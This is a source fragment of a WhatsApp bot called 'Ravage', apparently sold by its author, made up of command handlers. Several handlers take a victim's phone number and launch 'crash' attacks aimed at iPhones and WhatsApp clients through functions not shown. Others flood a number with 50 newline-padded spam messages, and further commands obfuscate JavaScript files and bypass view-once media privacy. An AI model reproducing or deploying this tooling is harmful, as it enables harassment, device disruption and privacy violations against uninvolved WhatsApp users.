case "bugmenu": case "bugravage": {
await dafa.sendMessage(m.chat, { react: { text: `🥵`, key: m.key } });

let msgbug = `Hi I'm Ravage Whatsapp Bot Created By Daffa Dev

[ ♢ ] 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗕𝗼𝘁
* Creator : 𝗗𝗮𝗳𝗳𝗮 𝗗𝗲𝘃
* Bot Name : Ravage
* Version : 𝟯.𝟬.𝟬
* Prefix : "."
* Type : 𝗖𝗮𝘀𝗲
[ ♢ ] 𝗕𝘂𝗴𝘀 𝗙𝗲𝗮𝘁𝘂𝗿𝗲
* Flowclose 𝗡𝘂𝗺𝗯𝗲𝗿
* Msgflow 𝗡𝘂𝗺𝗯𝗲𝗿
* Nativecore 𝗡𝘂𝗺𝗯𝗲𝗿
* Locax 𝗡𝘂𝗺𝗯𝗲𝗿
* Flowfc 𝗡𝘂𝗺𝗯𝗲𝗿
[ ♢ ] 𝗜𝗽𝗵𝗼𝗻𝗲 𝗕𝘂𝗴𝘀 𝗙𝗲𝗮𝘁𝘂𝗿𝗲
* 𝗜𝗽𝗵𝗼𝗻𝗲-𝗰𝗿𝗮𝘀𝗵 𝗡𝘂𝗺𝗯𝗲𝗿
* Iphone-crash-home 𝗡𝘂𝗺𝗯𝗲𝗿
[ ♢ ] 𝗦𝗽𝗮𝗺 𝗙𝗲𝗮𝘁𝘂𝗿𝗲
* Clearbug 𝗡𝘂𝗺𝗯𝗲𝗿
* Spamripper 𝗡𝘂𝗺𝗯𝗲𝗿
* Spamyatim 𝗡𝘂𝗺𝗯𝗲𝗿
[ ♢ ] 𝗦𝗽𝗲𝗰𝗶𝗮𝗹 𝗙𝗲𝗮𝘁𝘂𝗿𝗲
* Ravage 𝗡𝘂𝗺𝗯𝗲𝗿`
let buttons = [
        { buttonId: ".daffaganteng", buttonText: { displayText: "Owner" } }, 
        { buttonId: ".thanksto", buttonText: { displayText: "Thanks To" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363331859075083@newsletter",
                newsletterName: "𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎"
            }
        },
        footer: "© Ravage V3",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await dafa.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}
break

case "ownermenu": {
let msgown = `Hi I'm Ravage Whatsapp Bot Created By Daffa Dev

[ ♢ ] 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗕𝗼𝘁
* Creator : 𝗗𝗮𝗳𝗳𝗮 𝗗𝗲𝘃
* Bot Name : Ravage
* Version : 𝟯.𝟬.𝟬
* Prefix : "."
* Type : 𝗖𝗮𝘀𝗲
[ ♢ ] 𝗢𝘄𝗻𝗲𝗿 𝗙𝗲𝗮𝘁𝘂𝗿𝗲
* addmurbug 𝗡𝘂𝗺𝗯𝗲𝗿
* delmurbug 𝗡𝘂𝗺𝗯𝗲𝗿
* hidetag 𝗧𝗲𝗸𝘀
* public
* Self`
let buttons = [
        { buttonId: ".daffaganteng", buttonText: { displayText: "Owner" } }, 
        { buttonId: ".thanksto", buttonText: { displayText: "Thanks To" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: msgown,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363331859075083@newsletter",
                newsletterName: "𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎"
            }
        },
        footer: "© Ravage V3",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await dafa.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}
break

case 'owner': case "daffaganteng": {
dafa.sendMessage(from, {react: {text: "👤", key: m.key}})
let menu = `
*\`𝘾𝙊𝙉𝙏𝘼𝘾𝙏𝙎 𝙊𝙒𝙉𝙀𝙍\`*

*👋 ʜɪ ᴋᴀᴋ*
_ᴄᴏɴᴛᴀᴄᴛꜱ ᴄʀᴇᴀᴛᴏʀ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ_
_ᴍᴏʜᴏɴ ᴜɴᴛᴜᴋ ᴛɪᴅᴀᴋ ꜱᴘᴀᴍ ᴀᴛᴀᴜᴘᴜɴ ᴛᴇʟᴇᴘᴏɴ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ._
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: `𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎`,
 newsletterJid: "120363331859075083@newsletter",
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: dafa.decodeJid(dafa.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: menu
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: thumb }, { upload: dafa.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ᴏᴡɴᴇʀ\",\"url\":\"https://wa.me/6282321593192\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"sᴀʟᴜʀᴀɴ ɪɴғᴏ ᴜᴘᴅᴀᴛᴇ sᴄ\",\"url\":\"https://whatsapp.com/channel/0029Vaj0N1c2ZjCq1tOjgI0u\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"sᴀʟᴜʀᴀɴ ᴅᴇᴠ\",\"url\":\"https://whatsapp.com/channel/0029VakL4GD2phHJckS4Wc24\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
}],
 })
 })
 }
 }
}, {})

await dafa.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case "addmurbug":{
if (!isOwner) return replydaf(`\`𝗙𝗶𝘁𝘂𝗿 𝗞𝗵𝘂𝘀𝘂𝘀 𝗗𝗮𝗳𝗳𝗮 𝗗𝗲𝘃\``)
if (!args[0]) return replydaf(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××*_`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await dafa.onWhatsApp(prrkek)
if (ceknya.length == 0) return replydaf(`*\`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!\`*`)
ownerbot.push(prrkek)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(ownerbot))
replydaf(`*\`Nomor ${prrkek} Telah Menjadi Murbug!\`*`)
}
break

case "delmurbug":{
if (!isOwner) return replydaf(`\`𝗙𝗶𝘁𝘂𝗿 𝗞𝗵𝘂𝘀𝘂𝘀 𝗗𝗮𝗳𝗳𝗮 𝗗𝗲𝘃\``)
if (!args[0]) return replydaf(`_*Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××*_`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerbot.indexOf(ya)
ownerbot.splice(unp, 1)
fs.writeFileSync("./lib/Database/owner.json", JSON.stringify(ownerbot))
reply(`*\`Nomor ${ya} Telah Di Hapus Murbug!\`*`)
}    
break

case "public": { 
if (!isBot) return DaffaReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
dafa.public = true
DaffaReply(`*\`Succes Beralih mode ke mode public\`*`)
}
break
case "self": { 
if (!isBot) return DaffaReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
dafa.public = false
DaffaReply(`*\`Succes Beralih mode ke mode self\`*`)
}
break

case "tqto": case "thanksto": {
let msgbug = `*\`▧ 「 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 𝗠𝗬 𝗙𝗥𝗜𝗘𝗡𝗗𝗦 」\`*

ʙᴀʀᴍᴏᴅs (ᴛᴇᴀᴄʜᴇʀ) 
ᴄʜɪᴋᴀ (ᴍʏ ʟᴏᴠᴇ) 
ᴡᴀɴɴ ᴏғғᴄ (ᴘᴀʀᴛɴᴇʀ) 
ᴅᴀᴘᴘᴢ (ʙᴇsᴛ ғʀɪᴇɴᴅs)
ᴊᴜsᴛɪɴ ᴏғғᴄ (ʙᴇsᴛ ғʀɪᴇɴᴅs)
ᴇʀʟᴀɴɢɢᴀ (ʙᴇsᴛ ғʀɪᴇɴᴅs)
ʜᴀᴍᴍ ᴏғғᴄ (ᴍʏ ғʀɪᴇɴᴅs)
ᴀɪᴍᴀ (ᴍʏ ғʀɪᴇɴᴅs)
ᴋʏᴀᴍɪ (ᴍʏ ғʀɪᴇɴᴅs)
ʀɪsᴍᴀ (ᴍʏ ғʀɪᴇɴᴅs)
ᴘᴀɪɴ (ᴍʏ ғʀɪᴇɴᴅs)
ᴋᴀʏʏ (ᴍʏ ғʀɪᴇɴᴅs)
ᴅᴀɴ ᴛᴇᴍᴀɴ-ᴛᴇᴍᴀɴ ʟᴀɪɴɴʏᴀ.
`
let buttons = [
        { buttonId: ".xmenu", buttonText: { displayText: "ＢＡＣＫ ＴＯ ＭＥＮＵ" } }
    ];

    let buttonMessage = {
         image: fs.readFileSync('./menu.png'), 
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363331859075083@newsletter",
                newsletterName: "𝐑͢𝐀͡𝐕͢𝐀͡𝐆͜͢𝐄 𝐕͢𝟑.𝟎"
            }
        },
        footer: "ᴅᴀғғᴀ ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await dafa.sendMessage(m.chat, buttonMessage, { quoted: ftoko });
}
break;

case 'script': case "scriptravage": {
let buy = `*\`▧ 「 𝗕𝗨𝗬 - 𝗦𝗖𝗥𝗜𝗣𝗧  - 𝗥𝗔𝗩𝗔𝗚𝗘 」\`*
╭────────────────━
┃友 *\`MAU BELI SC INI?\`*
┃
┃- *ʀᴀᴠᴀɢᴇ ᴠ 𝟸.𝟶 - 𝟹𝟶𝙺 -*
┃- *ʀᴀᴠᴀɢᴇ ᴠ 𝟹.𝟶 - 𝟺𝟻𝙺 -*
┃
┃友 *Chat 1 : wa.me/6282321593192*
╰────────────────━`
dafa.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 40000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
await sleep(2500)
DaffaDevStickSc()
}
break

case "hidetag": case "h": {
if (!isOwner) return (`*\`Fitur ini Khusus Owner Daffa Dev\`*`)
if (!isBotAdmins) return reply(`bot harus admin *bang dafa*`)
if (!isAdmins && !isCreator) return reply(`*Khusus Admin dafa aja*`) 
if (!m.quoted && !text) return reply(`Example : ${prefix + command} teks/reply teksnya mana daf?`)
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
dafa.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break

// Case Bug Ravage //
case 'iphone-crash': case 'iphone-crash-home': {
if (!isOwner && !isAccDaffaDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DaffaReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await Buk5000(target);
dafa.sendMessage(from, {react: {text: "🥱", key: m.key}})
}
break

case 'flowclose': {
if (!isOwner && !isAccDaffaDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DaffaReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await Buk1000(target);
dafa.sendMessage(from, {react: {text: "🥱", key: m.key}})
}
break

case 'msgflow': {
if (!isOwner && !isAccDaffaDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DaffaReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await Buk2000(target);
dafa.sendMessage(from, {react: {text: "🥱", key: m.key}})
}
break

case 'nativecore': {
if (!isOwner && !isAccDaffaDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DaffaReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await Buk3000(target);
dafa.sendMessage(from, {react: {text: "🥱", key: m.key}})
}
break

case 'locax': {
if (!isOwner && !isAccDaffaDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DaffaReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await Buk4000(target);
dafa.sendMessage(from, {react: {text: "🥱", key: m.key}})
}
break

case 'flowfc': {
if (!isOwner && !isAccDaffaDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ')
if (!q) return reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
DaffaReply(`*_🔄 Prosess Attack To ${pepec}⚡, Please Wait Few A Minutes‼️_*`)
await doneress();
// Memulai Crashing
await Buk3000(target);
dafa.sendMessage(from, {react: {text: "🥱", key: m.key}})
}
break

case "clearbug":
        {
          if (!isOwner && !isAccDaffaDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ');
          if (!q) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ${prefix + command} 𝟲𝟮×××`);
          let pepec = q.replace(/[^0-9]/g, "");
          if (pepec.startsWith("0"))
            return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝟲𝟮×××`);
          let target = pepec + "@s.whatsapp.net";
          for (let i = 0; i < 3; i++) {
            await dafa.sendMessage(target, {
              text: "𝘿𝘼𝙁𝙁𝘼 𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝘿𝘼𝙁𝙁𝘼 𝘾𝙇𝙀𝘼𝙍 𝘽𝙐𝙂",
            });
          }
          reply("*\`𝗗𝗢𝗡𝗘 𝗖𝗟𝗘𝗔𝗥 𝗕𝗨𝗚𝗦!!!\`*");
        }
        break
        
        case "spamripper":
        {
if (!isOwner && !isAccDaffaDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ');
          if (!q) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ${prefix + command} 𝟲𝟮×××`);
          let pepec = q.replace(/[^0-9]/g, "");
          if (pepec.startsWith("0"))
            return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝟲𝟮×××`);
          let target = pepec + "@s.whatsapp.net";
          for (let i = 0; i < 50; i++) {
            await dafa.sendMessage(target, {
              text: "𝐖𝐎𝐈 𝐑𝐈𝐏𝐏𝐄𝐑 𝐊𝐎𝐍𝐓𝐎𝐋\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐌𝐈𝐒𝐊𝐈𝐍 𝐓𝐎𝐋𝐎𝐋",
            });
          }
          reply(`*\`𝗗𝗢𝗡𝗘 𝗦𝗣𝗔𝗠 𝗥𝗜𝗣𝗣𝗣𝗘𝗥 𝗧𝗢 ${pepec}\`*`);
        }
        break
        
        case "spamyatim":
        {
          if (!isOwner && !isAccDaffaDev) return reply('*[Akses Ditolak!!]*\nғɪᴛᴜʀ ᴋʜᴜsᴜs ᴅᴀғғᴀ-ᴅᴇᴠ');
          if (!q) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 ${prefix + command} 𝟲𝟮×××`);
          let pepec = q.replace(/[^0-9]/g, "");
          if (pepec.startsWith("0"))
            return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix + command} 𝟲𝟮×××`);
          let target = pepec + "@s.whatsapp.net";
          for (let i = 0; i < 50; i++) {
            await dafa.sendMessage(target, {
              text: "𝐖𝐎𝐈 𝐘𝐀𝐓𝐈𝐌\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐘𝐀𝐓𝐈𝐌 𝐃𝐎𝐍𝐆𝐎",
            });
          }
          reply(`*\`𝗗𝗢𝗡𝗘 𝗦𝗣𝗔𝗠 𝗬𝗔𝗧𝗜𝗠 𝗧𝗢 ${pepec}\`*`);
        }
        break
        
        case 'enchard': {
    if (!m.quoted) return reply("Reply filenya .js");
    if (mime !== "application/javascript") return reply("Reply filenya .js");
    let a = await m.quoted.download(),
        b = m.quoted.fileName;
    await fs.writeFileSync(`./@hardenc${b}.js`, a);
    await reply("Memproses encrypt hard code . . .");

    await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${b}.js`).toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const c = "素晴座素晴難DaffaDev素晴座素晴難" + "素晴座素晴難DaffaGanteng素晴座素晴難",
                d = x => x.replace(/[^a-zA-Z座DaffaDev素Crasher素晴]/g, ''),
                e = y => [...Array(y)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.random() * 52 | 0)).join('');
            return d(c) + e(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1,
        shuffle: { hash: 0, true: 0 },
        stack: true,
        controlFlowFlattening: 1,
        opaquePredicates: 0.9,
        deadCode: 0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    }).then(async f => {
        await fs.writeFileSync(`./@hardenc${b}.js`, f);
        await dafa.sendMessage(
            m.chat,
            { document: fs.readFileSync(`./@hardenc${b}.js`), mimetype: "application/javascript", fileName: b, caption: "Encrypt File JS Sukses! Type:\nString" },
            { quoted: m }
        );
    }).catch(g => reply("Error :" + g));
}
break;

//============= [ BATAS CASE BUG ] ==========//

  case "play": case "dplay": {
    if (!text) return reply('we dont talk')
    await dafa.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })

    let ytsSearch = await yts(text)
    const anuan = ytsSearch.all
    if (!anuan.length) return DaffaReply("Tidak ditemukan hasil untuk pencarian tersebut!")

    let teksnya = "📽 *Hasil Pencarian YouTube*\n\nPilih salah satu untuk mendengarkan atau menonton:"
    
    let sections = []
    let addedTitles = new Set()

    for (let res of anuan.slice(0, 7)) {
        let title = res.title
        let channel = res.author.name || "Unknown"
        let duration = res.timestamp
        let views = res.views
        
        if (!addedTitles.has(title)) {
            sections.push({
                "title": title, 
                "rows": []
            })
            addedTitles.add(title)
        }

        let sectionIndex = sections.findIndex(sec => sec.title === title)

        sections[sectionIndex].rows.push({
            "title": "🎶 Play Audio",
            "description": `📢 ${channel} • ⏳ ${duration}`,
            "id": `.xytmp3 ${res.url}`
        })
        sections[sectionIndex].rows.push({
            "title": "📺 Play Video",
            "description": `📢 ${channel} • ⏳ ${duration}`,
            "id": `.xytmp4 ${res.url}`
        })
    }

    let msgii = generateWAMessageFromContent(m.chat, { 
        viewOnceMessage: { 
            message: { 
                "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 }, 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: { mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true }}, 
                    body: proto.Message.InteractiveMessage.Body.create({ text: teksnya }), 
                    footer: proto.Message.InteractiveMessage.Footer.create({ text: "Daffa" }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [{
                            "name": "single_select",
                            "buttonParamsJson": `{ "title": "Pilih Opsi", "sections": ${JSON.stringify(sections)} }`
                        }]
                    })
                }) 
            } 
        }
    }, { userJid: m.sender, quoted: PayX }) 

    await dafa.relayMessage(msgii.key.remoteJid, msgii.message, { messageId: msgii.key.id })
}
break

case 'kick': {
if (!isAccDaffaDev) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  if (!Adm) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return DaffaReply("Send number / tag users ");
  await dafa.groupParticipantsUpdate(from, [users], 'remove');
}
break;

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return reply("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return DaffaReply("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return DaffaReply("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await dafa.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await dafa.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await dafa.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break

case 'produk':
msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.create({
            text: ''
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `ʙᴇʀɪᴋᴜᴛ ᴀᴅᴀʟᴀʜ :\n *ᴛᴀᴍᴘɪʟᴀɴ ᴘʀᴏᴅᴜᴋ*`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
{
              body: proto.Message.InteractiveMessage.Body.fromObject({
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `『 \`𝗩𝗣𝗦 𝗗𝗜𝗚𝗜𝗧𝗔𝗟 𝗢𝗖𝗘𝗔𝗡\` 』
ᴋᴇɴᴀᴘᴀ ᴍᴀʜᴀʟ? ᴋᴀʀᴇɴᴀ ᴊᴜᴀʟ ᴋᴜᴀʟɪᴛᴀs ʙᴜᴋᴀɴ ᴊᴜᴀʟ ᴍᴜʀᴀʜ ᴛᴀᴘɪ ᴄᴇᴘᴇᴛ ᴍᴏᴋᴀᴅ ʙᴏʏ🤪

𝙍𝘼𝙈 𝟭𝙂𝘽 𝟭𝘾𝙊𝙍𝙀
Rp15.000/15K

𝙍𝘼𝙈 𝟮𝙂𝘽 𝟭𝘾𝙊𝙍𝙀
Rp20.000/20K

𝙍𝘼𝙈 𝟰𝙂𝘽 𝟮𝘾𝙊𝙍𝙀
Rp35.000/35K

𝙍𝘼𝙈 𝟴𝙂𝘽 𝟰𝘾𝙊𝙍𝙀
Rp.50.000

𝙍𝘼𝙈 𝟭𝟲𝙂𝘽 𝟰𝘾𝙊𝙍𝙀
Rp.65.000

𝙆𝙀𝙐𝙉𝙏𝙐𝙉𝙂𝘼𝙉 𝘽𝙀𝙇𝙄 𝙑𝙋𝙎
#𝘼𝙆𝙏𝙄𝙁 𝟯𝟬 𝙃𝘼𝙍𝙄
#𝙂𝘼𝙍𝘼𝙉𝙎𝙄 𝟮𝟬 𝙃𝘼𝙍𝙄
#𝙁𝙍𝙀𝙀 𝙍𝙀𝙌 𝙍𝙀𝙂𝙄𝙊𝙉 & 𝙊𝙎 & 𝙑𝙀𝙍𝙎𝙄
#𝙁𝙍𝙀𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 𝙋𝘼𝙉𝙀𝙇 & 𝙉𝙊𝘿𝙀
#𝙁𝙍𝙀𝙀 𝙍𝙀𝙌 𝙎𝙐𝘽𝘿𝙊 / 𝙉𝘼𝙈𝘼 𝙋𝘼𝙉𝙀𝙇
#𝙁𝙍𝙀𝙀 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 𝙏𝙃𝙀𝙈𝘼
`,
                hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: thumb }, { upload: dafa.waUploadToServer }))
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
{
   "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ʙᴇʟɪ sᴇᴋᴀʀᴀɴɢ🛒\",\"url\":\"https://wa.me/6282321593192\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
  {
  "name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ᴛᴇsᴛɪᴍᴏɴɪ\",\"url\":\"https://whatsapp.com/channel/0029Vaj0N1c2ZjCq1tOjgI0u\",\"merchant_url\":\"https://wa.me/6282321593192\"}`
   },
                  ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
              }),
              footer: proto.Message.InteractiveMessage.Footer.fromObject({
              }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
